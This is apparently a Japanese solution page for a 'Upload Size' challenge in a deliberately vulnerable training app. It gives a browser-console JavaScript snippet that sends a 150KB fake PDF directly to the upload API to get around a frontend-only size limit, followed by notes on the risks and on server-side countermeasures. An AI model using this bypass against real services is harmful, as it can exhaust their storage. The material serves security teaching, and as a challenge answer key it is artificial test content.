# Upload Size ✅

**難易度:** ⭐⭐⭐
**カテゴリ:** 入力検証
**目標:** 100KB以上のファイルをアップロードする

---

## 実行手順

DevToolsのConsoleで以下を実行:

```javascript
const token = localStorage.getItem('token');
const largeContent = 'A'.repeat(150 * 1024); // 150KB
const blob = new Blob([largeContent], { type: 'application/pdf' });
const file = new File([blob], 'large.pdf', { type: 'application/pdf' });
const formData = new FormData();
formData.append('file', file);

fetch('/file-upload', {
  method: 'POST',
  headers: { 'Authorization': 'Bearer ' + token },
  body: formData
});
```

## 解説

- フロントエンドでは100KB未満に制限されている
- しかしAPIに直接送信すると制限をバイパス
- 大きなファイルをアップロードしてサーバーのディスクを消費可能

**リスク:**
- ディスク容量の枯渇（DoS）
- メモリ消費
- 処理時間の増大

**対策:**
- サーバー側でもファイルサイズを検証
- ストレージクォータの設定
- アップロードレート制限

## 関連チャレンジ

- [Upload Type](upload-type.md)
- [Deprecated Interface](../difficulty-2/deprecated-interface.md)
